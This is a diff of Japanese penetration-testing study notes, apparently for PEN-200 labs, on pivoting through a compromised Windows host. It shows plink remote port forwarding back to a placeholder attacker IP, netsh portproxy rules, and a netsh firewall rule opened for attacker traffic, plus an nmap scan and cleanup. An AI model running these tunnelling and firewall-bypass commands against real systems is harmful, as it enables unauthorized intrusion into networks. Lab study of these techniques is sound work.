@@ -406,57 +406,48 @@ sudo systemctl start ssh
 ```
 
 3. 足場のマシン上でリモートポートフォワーディング
-	- このコマンドで表示されるシェルには何も入力しない
+	- このコマンドで表示されるシェルには何も入力しないこと
 ```powershell
 # windowsシェルが非ttyシェルの場合は先頭に`cmd.exe /c echo y |`を追加
-C:\Windows\Temp\plink.exe -ssh -l [攻撃者のusername] -pw [pw] -R 127.0.0.1:[SSH server LISTEN Port(1025以上任意)]:127.0.0.1:[Plinkクライアントリッスンポート] [AttackerIP]
+C:\Windows\Temp\plink.exe -ssh -l <attacker_ssh_username> -pw <password> -R 127.0.0.1:<SSH_server_listen_port(Attacker)>:127.0.0.1:<Plink_client_listen_port> <attacker_IP>
 ```
-![](../../../画像ファイル/Pasted%20image%2020250924122130.png)
-$$PlinkポートフォワーディングでFWをバイパスしているイメージ図(PEN-200)$$
 
 4. 任意の操作を実施
 ```zsh
 # proxychainsは不要
 # mysql接続例
-mysql -h 127.0.0.1 -P <SSH server LISTEN Port(1025以上任意)> -u <username> -p
+mysql -h 127.0.0.1 -P <SSH_server_listen_port> -u <username> -p
 ```
 
----
-
-## Netsh
+## 🔗[Netsh](https://learn.microsoft.com/ja-jp/windows-server/administration/windows-commands/netsh)
 
 - NetshはWindows OS標準の機能で、SSHクライアントに使えるツールが何もないときなど、特に制限が厳しいときに使用する
 - 条件：
 	- 足場のマシンへのCLIアクセスが可能なとき
 	- **管理者権限**があるとき
 
-
 1. 管理者権限でcmd.exeを開き、netshのportproxyルールを追加しポートフォワーディング
 	- 出力はなし
-```cmd
-netsh interface portproxy add v4tov4 listenport=[Netshクライアントリッスンポート(1025以上任意)] listenaddress=[NetshクライアントIP] connectport=[Dest Port] connectaddress=[target_IP]
+```powershell
+netsh interface portproxy add v4tov4 listenport=<Netsh_client_listen_port> listenaddress=<Netsh_client_IP> connectport=<connect_port> connectaddress=<target_IP>
 ```
 - `v4tov4`：IPv4からIPv4へのポートフォワーディングを意味する
-![](../../../画像ファイル/Pasted%20image%2020250925065912.png)
-$$netshによるポートフォワーディングのイメージ(PEN-200)$$
 
-2. 攻撃者のマシンから足場のマシンへの通信がFWで遮断される場合は、netshでFWを操作し、リッスンポートへの通信を許可する
-	- 成功時はOk.と出力
-```cmd
-netsh advfirewall firewall add rule name="[rule name]" protocol=TCP dir=in localip=[NetshクライアントIP] localport=[指定したリッスンポート] action=allow
+2. 攻撃者のマシンから足場のマシンへの通信がFWで遮断される場合は、netshでFWを操作し、リッスンポートへの通信を許可する（成功時はOk.と出力される）
+```powershell
+netsh advfirewall firewall add rule name="<rule_name>" protocol=TCP dir=in localip=<Netsh_client_IP> localport=<connect_port> action=allow
 ```
-![](../../../画像ファイル/Pasted%20image%2020250925071526.png)
-$$netshでFWの穴あけ後$$
+
 3. 攻撃者のマシンからNmap等でリッスンポート経由でtargetのソケットにアクセス
 ```zsh
 # 例
-sudo nmap -sS [NetshクライアントIP] -Pn -n -p [指定したリッスンポート]
+sudo nmap -sS <Netsh_client_IP> -Pn -n -p <connect_port>
 ```
 
 4. netshによる変更の取り消し
 ```powershell
 # FWルールの削除
-netsh advfirewall firewall delete rule name="[rulename]"
+netsh advfirewall firewall delete rule name="[rule_name>"
 # ポートフォワーディングの削除
 netsh interface portproxy del v4tov4 listenport=[指定したリッスンポート] listenaddress=[NetshクライアントIP]
 ```
